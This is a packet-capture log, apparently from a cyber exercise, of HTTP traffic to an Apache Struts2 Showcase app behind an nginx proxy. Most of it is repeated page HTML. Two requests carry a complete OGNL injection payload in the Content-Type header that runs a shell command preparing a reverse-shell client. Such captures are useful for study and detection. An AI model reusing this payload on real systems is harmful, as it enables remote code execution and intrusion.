+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action">Hangman (Non Ajax)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanAjax.action">Hangman (Ajax - Experimental)</a></li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/empmanager/index.jsp">CRUD</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/wait/index.jsp">Execute &amp; Wait</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/token/index.jsp">Token</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/validation/index.jsp">Validation</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/modelDriven/modelDriven.action">Model Driven</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Integration<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Freemarker</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/customFreemarkerManagerDemo.action">Demo of usage of a Custom Freemarker Manager</a>
+.........</li>
+.........<.
+9ad.
+li>
+..........
+..........<a href="/struts2-showcase-2.3.12/freemarker/standardTags.action">Demo of Standard Struts Freemarker Tags</a>
+.........</li>
+........</ul>
+.......</li>
+.......<li><a href="/struts2-showcase-2.3.12/jsf/index.jsp">JavaServer Faces</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/i
+
+T 192.168.1.100:80 -> 192.168.33.1:56582 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:48:43 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+.
+1f4c.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action">Hangman (Non Ajax)</a></li>
+.........<l
+
+T 192.168.33.20:57864 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+host: target.cyexc-target.
+Connection: close.
+.
+
+
+T 192.168.1.100:37895 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: Mozilla/5.0.
+Content-Type: Content-Type:%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='chmod 700 reverseShellClient.js').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37895 [AP]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:48:54 GMT.
+Connection: close.
+.
+
+
+T 192.168.1.100:80 -> 192.168.33.20:57864 [AP]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:48:54 GMT.
+Transfer-Encoding: chunked.
+Connection: close.
+.
+
+
+T 192.168.33.20:57865 -> 192.168.1.100:80 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+User-Agent: curl/7.35.0.
+Host: target.cyexc-target.
+Accept: */*.
+.
+
+
+T 192.168.1.100:37896 -> 192.168.1.10:8080 [AP]
+GET /struts2-showcase-2.3.12/index.action HTTP/1.1.
+X-Forwarded-Host: target.cyexc-target.
+X-Forwarded-Server: target.cyexc-target.
+X-Forwarded-For: 192.168.33.20.
+X-Forwarded-Proto: http.
+X-Real-IP: 192.168.33.20.
+Host: target.cyexc-target.
+Connection: close.
+User-Agent: curl/7.35.0.
+Accept: */*.
+.
+
+
+T 192.168.1.10:8080 -> 192.168.1.100:37896 [A]
+HTTP/1.1 200 OK.
+Server: Apache-Coyote/1.1.
+Set-Cookie: JSESSIONID=CFA1B6B87AEADD64736B6191C58B6359; Path=/struts2-showcase-2.3.12; HttpOnly.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Date: Fri, 19 Jan 2018 04:49:39 GMT.
+Connection: close.
+.
+2000.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">DateTime picker tag - Pick a date</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/timepicker/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">DateTime picker tag - Pick a time</a></li>
+.........
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/filedownload/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">File Download</a></li>
+.......<li class="dropdown-submenu">
+........<a href="#">File Upload</a>
+........<ul class="dropdown-menu">
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/upload.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Single File Upload</a>
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingList.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Multiple File Upload (List)</a>
+
+.........</li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/fileupload/multipleUploadUsingArray.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Multiple File Upload (Array)</a>
+.........</li>
+........</ul>
+.......</li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+......<ul class="dropd.
+11ed.
+own-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Hangman</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/hangman/hangmanNonAjax.action;jsessionid=CFA1B6B
+
+T 192.168.1.100:80 -> 192.168.33.20:57865 [A]
+HTTP/1.1 200 OK.
+Server: nginx/1.13.8.
+Date: Fri, 19 Jan 2018 04:49:39 GMT.
+Content-Type: text/html;charset=ISO-8859-1.
+Transfer-Encoding: chunked.
+Connection: keep-alive.
+Set-Cookie: JSESSIONID=CFA1B6B87AEADD64736B6191C58B6359; Path=/struts2-showcase-2.3.12; HttpOnly.
+.
+1eea.
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+<head>
+.<meta charset="utf-8">
+.<meta name="viewport" content="width=device-width, initial-scale=1.0">
+.<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+.<meta name="description" content="Struts2 Showcase for Apache Struts Project">
+.<meta name="author" content="The Apache Software Foundation">
+
+.<title>Struts2 Showcase</title>
+
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/bootstrap-responsive.css" rel="stylesheet"
+.      type="text/css" media="all">
+.<link href="/struts2-showcase-2.3.12/styles/main.css" rel="stylesheet" type="text/css"
+.      media="all"/>
+
+.<script src="/struts2-showcase-2.3.12/js/jquery-1.8.2.min.js"></script>
+.<script src="/struts2-showcase-2.3.12/js/bootstrap.min.js"></script>
+.<script type="text/javascript">
+..$(function () {
+...$('.dropdown-toggle').dropdown();
+...var alerts = $('ul.alert').wrap('<div />');
+...alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+...alerts.alert();
+..});
+.</script>
+
+.<!-- Prettify -->
+.<link href="/struts2-showcase-2.3.12/styles/prettify.css" rel="stylesheet">
+.<script src="/struts2-showcase-2.3.12/js/prettify.js"></script>
+
+.<!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+.<!--[if lt IE 9]>
+.<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+.<![endif]-->
+
+.<script src="/struts2-showcase-2.3.12/struts/utils.js" type="text/javascript"></script>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+<div class="navbar navbar-fixed-top">
+.<div class="navbar-inner">
+..<div class="container-fluid">
+...<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+....<span class="icon-bar"></span>
+...</a>
+...<a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359" class="brand">Struts2 Showcase</a>
+...<div class="nav-collapse">
+....<ul class="nav">
+.....<li><a href="/struts2-showcase-2.3.12/showcase.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359"><i class="icon-home"></i> Home</a></li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+........class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li><a href="/struts2-showcase-2.3.12/actionchaining/actionChain1!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Chaining</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/config-browser/index.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Config Browser</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/conversion/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Conversion</a></li>
+.......<li><a href="/struts2-showcase-2.3.12/person/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Person Manager ( by Conventions )</a></li>
+......</ul>
+.....</li>
+.....<li class="dropdown">
+......<a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+......<ul class="dropdown-menu">
+.......<li class="dropdown-submenu">
+........<a href="#">Non UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionTag/showActionTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/date.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Date Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/debugTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Debug Tag</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Iterator Generator Tag</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/appendIteratorTag/showAppendTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Append Iterator Tag</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Merge Iterator Demo</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Subset Tag</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Prefix Example (Freemarker)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagJsp.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">If Tag (JSP)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/non-ui/ifTag/testIfTagFreemarker.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">If Tag (Freemarker)</a></li>
+........</ul>
+
+.......</li>
+.......<li class="dropdown-submenu">
+........<a href="#">UI Tags</a>
+........<ul class="dropdown-menu">
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/example!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/exampleVelocity!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">UI Example (Velocity)</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/lotsOfOptiontransferselect!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Option Transfer Select UI Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/moreSelects!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">More Select Box UI Examples</a></li>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/treeExampleStatic.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Tree Example (static)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicTreeAction.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Tree Example (dynamic)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/showDynamicAjaxTreeAction.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Tree Example (dynamic ajax loading)</a>
+.........<li>
+..........
+..........<a href="/struts2-showcase-2.3.12/tags/ui/componentTagExample.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Component Tag Example</a>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/actionTagExample!input.action;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">Action Tag Example</a></li>
+.........<li><a href="/struts2-showcase-2.3.12/tags/ui/datepicker/index.jsp;jsessionid=CFA1B6B87AEADD64736B6191C58B6359">DateTime picker tag - Pick a date</a></li>
